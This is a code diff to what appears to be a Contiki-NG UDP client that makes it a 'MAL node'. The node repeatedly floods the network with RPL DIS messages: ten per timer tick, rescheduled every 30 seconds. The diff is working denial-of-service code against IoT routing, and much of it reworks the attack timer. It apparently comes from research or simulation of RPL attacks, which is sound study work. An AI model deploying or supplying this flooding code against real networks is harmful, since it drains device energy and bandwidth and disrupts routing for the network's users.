@@ -19,7 +19,8 @@
 
 static struct simple_udp_connection udp_conn;
 static void rpl_attack();
- static struct ctimer mytime;
+ static struct ctimer attack_time;
+//  static struct etimer mytime;
 
 /*---------------------------------------------------------------------------*/
 PROCESS(udp_client_process, "MAL node");
@@ -45,18 +46,29 @@ udp_rx_callback(struct simple_udp_connection *c,
 }
 
 static void rpl_attack(void *ptr){
+
+  // if (!etimer_expired(&mytime)){
+  //   ctimer_reset(&attack_time);
+  //   return;
+  // }
+      ctimer_reset(&attack_time);
+
   int i=0;
       //My code
       while (i<10){
         i++;
         rpl_icmp6_dis_output(NULL);
       }
-  ctimer_reset(&mytime);
+
+  
+  // ctimer_reset(&mytime);
 }
 /*---------------------------------------------------------------------------*/
 PROCESS_THREAD(udp_client_process, ev, data)
 {
   static struct etimer periodic_timer;
+    // static struct stimer stimer_mine;
+
  
   static unsigned count;
   static char str[32];
@@ -64,12 +76,24 @@ PROCESS_THREAD(udp_client_process, ev, data)
 
   PROCESS_BEGIN();
 
+  //   stimer_set(&stimer_mine, 10);
+  // while(stimer_expired(&stimer_mine)!=1)
+  // {
+  // // LOG_INFO("Waiting \n");
+  // }
+
   /* Initialize UDP connection */
   simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                       UDP_SERVER_PORT, udp_rx_callback);
 
   etimer_set(&periodic_timer, random_rand() % SEND_INTERVAL);
-  ctimer_set(&mytime,30*CLOCK_SECOND,rpl_attack,NULL);
+  // etimer_set(&mytime, 60*CLOCK_SECOND);
+
+  // ctimer_set(&mytime,60*CLOCK_SECOND,rpl_attack,NULL);
+  ctimer_set(&attack_time,30*CLOCK_SECOND,rpl_attack,NULL);
+
+
+
   while(1) {
     
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
